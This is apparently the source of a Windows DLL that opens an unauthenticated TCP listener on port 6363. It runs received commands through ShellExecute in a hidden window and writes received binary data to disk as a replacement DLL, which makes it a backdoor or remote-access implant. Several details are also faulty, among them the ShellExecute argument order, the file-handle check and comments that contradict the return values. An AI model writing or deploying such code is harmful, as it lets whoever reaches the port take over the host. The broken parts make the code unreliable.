#include "tcp_listener.h"
#include "Main.h"

BOOL WINAPI DllMain(
	HINSTANCE hinstDLL,		// handle to DLL module
	DWORD fdwReason,		// reason for calling function
	LPVOID lpReserved)		// reserved
{
	// Perform actions based on the reason for calling.
	switch (fdwReason)
	{

	case DLL_PROCESS_ATTACH:
		printf("Initialize once for each new process...\n");
		// Initialize once for each new process.
		// Return FALSE to fail DLL load.
		break;

	case DLL_THREAD_ATTACH:
		printf("Do thread-specific initialization...\n");
		// Do thread-specific initialization.
		break;

	case DLL_THREAD_DETACH:
		printf("Do thread-specific cleanup...\n");

		// Do thread-specific cleanup.
		break;


	case DLL_PROCESS_DETACH:
		printf("Perform any necessary cleanup...\n");

		// Perform any necessary cleanup.
		break;
	}

	// Successful DLL_PROCESS_ATTACH.
	return TRUE;
}

/**
After a command and execute the proper function in response
Returns the result of the proper requested function.

@param buffer: The command requested
@return Tthe result of the proper requested function.
*/
int OnAccept(char* buffer)
{
	char c_Type = buffer[0];
	int n_Length = *(int*)(buffer + 1);
	char* s_Value = buffer + 5;

	switch (c_Type)
	{
	case 'u':
		return Update(n_Length, s_Value);
	case 'c':
		return ExecuteCommand(n_Length, s_Value);
	default:
		return Echo(buffer);
		break;
	}
}

/**
Starting a new tcp connection and setting a socket om port 6363
*/
void StartConnection()
{
	const int port = 6363;

	//fList.emplace(std::make_pair("echo", Echo));

	tcp_listener listener(OnAccept);
	printf("Starting socket on port %d...\n", port);
	listener.start(port);

	return;
}


/**
@param buffer: An output buffer that will return the full path of the executable
Returns the full path of the executable.
*/
void GetExecutablePath(char* buffer)
{	
	GetModuleFileName(NULL, buffer, MAX_PATH);
	std::string::size_type pos = std::string(buffer).find_last_of("\\/");
	//std::string(buffer).substr(0, pos + 1);

	buffer[pos + 1] = '\0';
}

/**
Prints out the data received in the buffer

@param buffer: The data to echo out
@return -1
*/
const int Echo(char* buffer)
{
	//std::cout << buffer << std::endl;
	strcpy_s(buffer, 100, "echo from dll");

	return -2;
}

/**
Execute Command on the user machine

@param length: The length of the command to execute 
@param command: The data to echo out
@return -1
*/
const int ExecuteCommand(int length, char* command)
{
	ShellExecute(
		nullptr,	// hwnd,
		command,	// lpOperation,
		nullptr,	// lpFile,
		nullptr,	// lpParameters,
		nullptr,	// lpDirectory,
		SW_HIDE		// nShowCmd
	);

	return -1;
}

/**
After receiving an update command - digest a binary data and create a DLL file
Returns 0 if operation failed along the way.

@param length: The length of the data
@param value: The data to convert into DLL
@return 0 for a failure.
*/
const int Update(int length, char* value)
{
	char exePath[MAX_PATH];

	GetExecutablePath(exePath);
	std::string filePath(exePath);
	filePath.append("TcpServer.dll.new");

	// Saving binary data as TcpServer.dll.new
	auto hFile = CreateFile(
		filePath.c_str(),				// lpFileName,
		GENERIC_READ | GENERIC_WRITE,	// dwDesiredAccess,
		0,								// dwShareMode,
		NULL,							// lpSecurityAttributes,
		CREATE_ALWAYS,					// dwCreationDisposition,
		FILE_ATTRIBUTE_NORMAL,			// dwFlagsAndAttributes,
		NULL							// hTemplateFile
	);

	// if file could not be created
	if (!hFile) { return -1; }

	if (WriteFile(
		hFile,							// file handler
		value,							// data
		length,					// nNumberOfBytesToWrite 
		NULL,							// lpNumberOfBytesWritten 
		NULL							// lpOverlapped 
	)) 
	{
		// write succeded

		auto e = GetLastError();

		CloseHandle(hFile);
		return 0;
	}
	else 
	{
		// writing failed
		CloseHandle(hFile);
		return -1;
	}

}